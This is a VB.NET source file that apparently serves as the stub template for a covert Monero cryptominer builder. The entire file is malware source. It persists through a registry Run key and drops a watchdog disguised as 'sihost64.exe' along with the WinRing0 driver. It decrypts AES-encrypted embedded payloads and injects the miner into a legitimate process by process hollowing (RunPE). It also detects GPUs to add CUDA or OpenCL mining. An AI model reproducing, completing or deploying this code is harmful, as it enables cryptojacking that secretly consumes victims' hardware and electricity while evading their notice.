Imports System.Security.Cryptography
Imports Microsoft.Win32
Imports System.Management
Imports System
Imports System.Net.Sockets
Imports Microsoft.VisualBasic
Imports System.Diagnostics
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Collections.Generic
Imports System.Drawing
Imports System.Windows.Forms
Imports System.IO
Imports System.IO.Compression
Imports System.Net
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging
Imports System.Threading
Imports System.Security
Imports System.Text

#Const Assembly = False
#Const INS = False
#Const WD = False
#Const EnableGPU = False

#If Assembly Then
<Assembly: AssemblyTitle("%Title%")>
<Assembly: AssemblyDescription("%Description%")>
<Assembly: AssemblyCompany("%Company%")>
<Assembly: AssemblyProduct("%Product%")>
<Assembly: AssemblyCopyright("%Copyright%")>
<Assembly: AssemblyTrademark("%Trademark%")>
<Assembly: AssemblyFileVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")>
<Assembly: Guid("%Guid%")>
#End If

Public Class Program
    Public Shared lb As String = GetString("#LIBSPATH")
    Public Shared bD As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & lb

    Public Shared Sub Main()
#If INS Then
        Registry.CurrentUser.CreateSubKey(GetString("#REGKEY")).SetValue(Path.GetFileName(PayloadPath), PayloadPath)
        Install()
#End If
        Initialize()
    End Sub

#If INS Then
    Public Shared Sub Install()
        Thread.Sleep(2 * 1000)
        Try
            If Process.GetCurrentProcess.MainModule.FileName <> PayloadPath Then
                For Each P As Process In Process.GetProcesses
                    Try
                        If P.MainModule.FileName = PayloadPath Then
                            P.Kill()
                        End If
                    Catch : End Try
                Next
                System.IO.File.WriteAllBytes(PayloadPath, System.IO.File.ReadAllBytes(Process.GetCurrentProcess.MainModule.FileName))
                Thread.Sleep(2 * 1000)
                BaseFolder()
                Process.Start(PayloadPath)
                Environment.Exit(0)
            End If
        Catch ex As Exception
        End Try
    End Sub
#End If

    Public Shared Function GetTheResource(ByVal Get_ As String) As Byte()
        Dim MyResource As New Resources.ResourceManager("#ParentRes", Assembly.GetExecutingAssembly())
        Return AES_Decryptor(MyResource.GetObject(Get_))
    End Function

    Public Shared Function GetString(ByVal input As String)
        Return Encoding.ASCII.GetString(AES_Decryptor(Convert.FromBase64String(input)))
    End Function


    Public Shared Sub Run(ByVal PL As Byte(), ByVal arg As String, ByVal buffer As Byte())
        'Credits gigajew for RunPE https://github.com/gigajew/WinXRunPE-x86_x64
        Try
            Assembly.Load(PL).GetType(GetString("#DLLSTR")).GetMethod(GetString("#DLLOAD"), BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {buffer, GetString("#InjectionDir") & "\" & GetString("#InjectionTarget"), arg})
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Sub BaseFolder()
        Try
            System.IO.Directory.CreateDirectory(bD)
            Dim DirInfo As New IO.DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & lb.Split(New Char() {"\"c})(0))

#If WD Then
                    For Each proc As Process In Process.GetProcessesByName("sihost64")
                        proc.Kill()
                    Next

                    Threading.Thread.Sleep(3000)

                    System.IO.File.WriteAllBytes(bD & "sihost64.exe", GetTheResource("#watchdog"))

                    If Process.GetProcessesByName("sihost64").Length < 1 Then
                        Process.Start(bD & "sihost64.exe")
                    End If
#End If

            System.IO.File.WriteAllBytes(bD & "WR64.sys", GetTheResource("#winring"))
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Function CheckProc()
        On Error Resume Next
        Dim options As ConnectionOptions = New ConnectionOptions()
        options.Impersonation = ImpersonationLevel.Impersonate
        Dim scope As ManagementScope = New ManagementScope("\\" + Environment.UserDomainName + "\root\cimv2", options)
        scope.Connect()

        Dim wmiQuery As String = String.Format("Select CommandLine from Win32_Process where Name='{0}'", GetString("#InjectionTarget"))
        Dim query As ObjectQuery = New ObjectQuery(wmiQuery)
        Dim managementObjectSearcher As ManagementObjectSearcher = New ManagementObjectSearcher(scope, query)
        Dim managementObjectCollection As ManagementObjectCollection = managementObjectSearcher.Get()

        For Each retObject As ManagementObject In managementObjectCollection
            If retObject("CommandLine").ToString().Contains("--donate-l") Then
                Return True
            End If
        Next
        Return False
    End Function

    Public Shared Sub Initialize()
        If IsNumeric("#STARTDELAY") AndAlso CInt("#STARTDELAY") > 0 Then
            Threading.Thread.Sleep(CInt("#STARTDELAY") * 1000)
        End If

        Try
            BaseFolder()

            Dim rS As String = ""
            Try

#If EnableGPU Then
            Dim GPUstr as String = GetGPU
            If GPUstr.ToLower.Contains("nvidia") OrElse GPUstr.ToLower.Contains("amd") Then
                Try
                    Using archive As ZipArchive = New ZipArchive(New MemoryStream(GetTheResource("#libs")))
                        For Each entry As ZipArchiveEntry In archive.Entries
                            entry.ExtractToFile(Path.Combine(bD, entry.FullName), True)
                        Next
                    End Using

                    If GPUstr.ToLower.Contains("nvidia") Then
                        rS += " --cuda --cuda-loader=" + ControlChars.Quote + bD + "ddb64.dll" + ControlChars.Quote
                    End If

                    If GPUstr.ToLower.Contains("amd") Then
                        rS += " --opencl "
                    End If

                Catch ex As Exception
                End Try
            End If
#End If
            Catch ex As Exception
            End Try
            Dim argstr As String = GetString("#ARGSTR") + rS
            argstr = Replace(argstr, "{%RANDOM%}", Guid.NewGuid.ToString().Replace("-", "").Substring(0, 10))
            argstr = Replace(argstr, "{%COMPUTERNAME%}", RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", "").Substring(0, 10))

            If CheckProc() Then
                Environment.Exit(0)
            End If

            Try
                Using archive As ZipArchive = New ZipArchive(New MemoryStream(GetTheResource("#xmr")))
                    For Each entry As ZipArchiveEntry In archive.Entries
                        If entry.FullName.Contains("ri") Then
                            Using streamdata As Stream = entry.Open()
                                Using ms = New MemoryStream()
                                    streamdata.CopyTo(ms)
                                    Run(GetTheResource("#dll"), argstr, ms.ToArray)
                                End Using
                            End Using
                        End If
                    Next
                End Using
            Catch ex As Exception
            End Try
        Catch ex As Exception
        End Try
    End Sub

#If EnableGPU Then
    Public Shared Function GetGPU() As String
        Try
            Dim VideoCard As String = ""
            Dim objquery As New System.Management.ObjectQuery("SELECT * FROM Win32_VideoController")
            Dim objSearcher As New System.Management.ManagementObjectSearcher(objquery)

            For Each MemObj As System.Management.ManagementObject In objSearcher.Get
                VideoCard = VideoCard & (MemObj("VideoProcessor")) & " "
            Next

            If VideoCard.ToLower.Contains("nvidia") OrElse VideoCard.ToLower.Contains("amd") Then
                Return VideoCard
            End If

            For Each MemObj As System.Management.ManagementObject In objSearcher.Get
                VideoCard = VideoCard & (MemObj("Name")) & " "
            Next

            If VideoCard.ToLower.Contains("nvidia") OrElse VideoCard.ToLower.Contains("amd") Then
                Return VideoCard
            End If
            Return ""
        Catch ex As Exception
            Return ""
        End Try
    End Function
#End If

    Public Shared Function AES_Decryptor(ByVal input As Byte()) As Byte()
        Dim initVectorBytes As Byte() = Encoding.ASCII.GetBytes("#IV")
        Dim saltValueBytes As Byte() = Encoding.ASCII.GetBytes("#SALT")
        Dim k1 As New Rfc2898DeriveBytes("#KEY", saltValueBytes, 100)
        Dim symmetricKey As New RijndaelManaged
        symmetricKey.KeySize = 256
        symmetricKey.Mode = CipherMode.CBC
        Dim decryptor As ICryptoTransform = symmetricKey.CreateDecryptor(k1.GetBytes(16), initVectorBytes)
        Using mStream As New MemoryStream()
            Using cStream As New CryptoStream(mStream, decryptor, CryptoStreamMode.Write)
                cStream.Write(input, 0, input.Length)
                cStream.Close()
            End Using
            Return mStream.ToArray()
        End Using
    End Function

End Class
